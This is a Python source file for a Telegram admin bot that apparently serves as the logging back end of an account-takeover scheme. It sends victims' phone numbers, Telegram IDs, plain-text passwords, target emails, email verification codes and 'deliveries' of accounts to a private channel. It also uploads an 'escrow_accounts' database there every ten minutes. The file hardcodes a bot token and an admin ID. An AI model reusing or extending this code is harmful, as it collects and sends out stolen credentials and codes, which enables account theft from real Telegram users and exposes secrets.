import asyncio
import os
import shutil
import json
from datetime import datetime
from typing import Optional
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = "8194328185:AAGPwP8d6IjQINEFVA_CgLBXO_KRNlxNTck"
ADMIN_IDS = [6213708507]
CONFIG_FILE = "log_bot_config.json"
DB_FILES = ["escrow_accounts.db", "test_accounts.db"]
BACKUP_INTERVAL = 600

log_settings = {"new_account": True, "password_set": True, "email_set": True, "email_code": True, "delivery": True, "error": True}
log_channel_id = None

def load_config():
    global log_channel_id, log_settings
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            cfg = json.load(f)
            log_channel_id = cfg.get("channel_id")
            log_settings.update(cfg.get("settings", {}))

def save_config():
    with open(CONFIG_FILE, 'w') as f:
        json.dump({"channel_id": log_channel_id, "settings": log_settings}, f)

def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

async def send_log(app: Application, log_type: str, message: str):
    if not log_channel_id or not log_settings.get(log_type, True):
        return
    try:
        await app.bot.send_message(chat_id=log_channel_id, text=message, parse_mode="HTML")
    except Exception as e:
        print(f"Error sending log: {e}")

async def log_new_account(app: Application, phone: str, telegram_id: int, target_email: str):
    msg = f"📥 <b>NEW ACCOUNT</b>\n\n📱 Phone: <code>{phone}</code>\n🆔 ID: <code>{telegram_id}</code>\n📧 Target Email:\n<code>{target_email}</code>\n\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    await send_log(app, "new_account", msg)

async def log_password_set(app: Application, phone: str, telegram_id: int, password: str):
    msg = f"🔐 <b>PASSWORD SET</b>\n\n📱 Phone: <code>{phone}</code>\n🆔 ID: <code>{telegram_id}</code>\n🔑 Password: <code>{password}</code>\n\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    await send_log(app, "password_set", msg)

async def log_email_set(app: Application, phone: str, telegram_id: int, email: str):
    msg = f"📧 <b>EMAIL CONFIRMED</b>\n\n📱 Phone: <code>{phone}</code>\n🆔 ID: <code>{telegram_id}</code>\n📧 Email: <code>{email}</code>\n\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    await send_log(app, "email_set", msg)

async def log_email_code(app: Application, phone: str, telegram_id: int, code: str, email_hash: str):
    msg = f"📨 <b>EMAIL CODE RECEIVED</b>\n\n📱 Phone: <code>{phone}</code>\n🆔 ID: <code>{telegram_id}</code>\n🔢 Code: <code>{code}</code>\n#️⃣ Hash: <code>{email_hash}</code>\n\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    await send_log(app, "email_code", msg)

async def log_delivery(app: Application, phone: str, telegram_id: int, delivery_num: int):
    msg = f"📦 <b>DELIVERED #{delivery_num}</b>\n\n📱 Phone: <code>{phone}</code>\n🆔 ID: <code>{telegram_id}</code>\n\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    await send_log(app, "delivery", msg)

async def log_error(app: Application, action: str, phone: str, error: str):
    msg = f"❌ <b>ERROR</b>\n\n🔧 Action: {action}\n📱 Phone: <code>{phone}</code>\n⚠️ Error: {error}\n\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    await send_log(app, "error", msg)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized")
        return
    kb = [[InlineKeyboardButton("⚙️ Log Settings", callback_data="settings")], [InlineKeyboardButton("📢 Set Channel", callback_data="set_channel")], [InlineKeyboardButton("💾 Backup Now", callback_data="backup_now")], [InlineKeyboardButton("📊 Stats", callback_data="stats")]]
    await update.message.reply_text(f"👋 Log Bot\n\n📢 Channel: {log_channel_id or 'Not set'}", reply_markup=InlineKeyboardMarkup(kb))

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not is_admin(query.from_user.id):
        return
    data = query.data
    if data == "settings":
        kb = []
        for key, val in log_settings.items():
            emoji = "✅" if val else "❌"
            names = {"new_account": "New Account", "password_set": "Password", "email_set": "Email Set", "email_code": "Email Codes", "delivery": "Delivery", "error": "Errors"}
            kb.append([InlineKeyboardButton(f"{emoji} {names.get(key, key)}", callback_data=f"toggle_{key}")])
        kb.append([InlineKeyboardButton("🔙 Back", callback_data="back")])
        await query.edit_message_text("⚙️ Log Settings:\n\nTap to toggle:", reply_markup=InlineKeyboardMarkup(kb))
    elif data.startswith("toggle_"):
        key = data.replace("toggle_", "")
        log_settings[key] = not log_settings.get(key, True)
        save_config()
        kb = []
        for k, v in log_settings.items():
            emoji = "✅" if v else "❌"
            names = {"new_account": "New Account", "password_set": "Password", "email_set": "Email Set", "email_code": "Email Codes", "delivery": "Delivery", "error": "Errors"}
            kb.append([InlineKeyboardButton(f"{emoji} {names.get(k, k)}", callback_data=f"toggle_{k}")])
        kb.append([InlineKeyboardButton("🔙 Back", callback_data="back")])
        await query.edit_message_text("⚙️ Log Settings:\n\nTap to toggle:", reply_markup=InlineKeyboardMarkup(kb))
    elif data == "set_channel":
        context.user_data["waiting_channel"] = True
        await query.edit_message_text("📢 Forward any message from your private channel to set it as log channel")
    elif data == "backup_now":
        await do_backup(context.application, query.message.chat_id)
    elif data == "stats":
        from backend.models.database import async_session, Account, AuthStatus
        from sqlalchemy import select, func
        async with async_session() as session:
            total = await session.scalar(select(func.count()).select_from(Account))
            completed = await session.scalar(select(func.count()).select_from(Account).where(Account.status == AuthStatus.COMPLETED))
        await query.edit_message_text(f"📊 Stats:\n\n📱 Total Accounts: {total}\n✅ Completed: {completed}\n📢 Channel: {log_channel_id or 'Not set'}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
    elif data == "back":
        kb = [[InlineKeyboardButton("⚙️ Log Settings", callback_data="settings")], [InlineKeyboardButton("📢 Set Channel", callback_data="set_channel")], [InlineKeyboardButton("💾 Backup Now", callback_data="backup_now")], [InlineKeyboardButton("📊 Stats", callback_data="stats")]]
        await query.edit_message_text(f"👋 Log Bot\n\n📢 Channel: {log_channel_id or 'Not set'}", reply_markup=InlineKeyboardMarkup(kb))

async def handle_forwarded(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if context.user_data.get("waiting_channel") and update.message.forward_from_chat:
        global log_channel_id
        log_channel_id = update.message.forward_from_chat.id
        save_config()
        context.user_data["waiting_channel"] = False
        await update.message.reply_text(f"✅ Channel set: {log_channel_id}\n\nMake sure bot is admin in the channel!")

async def do_backup(app: Application, chat_id: int = None):
    backup_dir = f"backups/{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    os.makedirs(backup_dir, exist_ok=True)
    files_backed = []
    for db_file in DB_FILES:
        if os.path.exists(db_file):
            shutil.copy(db_file, f"{backup_dir}/{db_file}")
            files_backed.append(db_file)
    if log_channel_id:
        for db_file in files_backed:
            try:
                with open(f"{backup_dir}/{db_file}", 'rb') as f:
                    await app.bot.send_document(chat_id=log_channel_id, document=f, caption=f"💾 Backup: {db_file}\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            except:
                pass
    if chat_id:
        await app.bot.send_message(chat_id=chat_id, text=f"✅ Backup created\n📁 {len(files_backed)} files")

async def backup_scheduler(app: Application):
    while True:
        await asyncio.sleep(BACKUP_INTERVAL)
        await do_backup(app)

_bot_app: Optional[Application] = None

def get_bot_app() -> Optional[Application]:
    return _bot_app

async def init_log_bot():
    global _bot_app
    load_config()
    _bot_app = Application.builder().token(BOT_TOKEN).build()
    _bot_app.add_handler(CommandHandler("start", start))
    _bot_app.add_handler(CallbackQueryHandler(callback_handler))
    _bot_app.add_handler(MessageHandler(filters.FORWARDED, handle_forwarded))
    asyncio.create_task(backup_scheduler(_bot_app))
    await _bot_app.initialize()
    await _bot_app.start()
    await _bot_app.updater.start_polling(drop_pending_updates=True)
    print("Log bot started")

async def stop_log_bot():
    global _bot_app
    if _bot_app:
        await _bot_app.updater.stop()
        await _bot_app.stop()
        await _bot_app.shutdown()

if __name__ == "__main__":
    async def main():
        await init_log_bot()
        while True:
            await asyncio.sleep(1)
    asyncio.run(main())
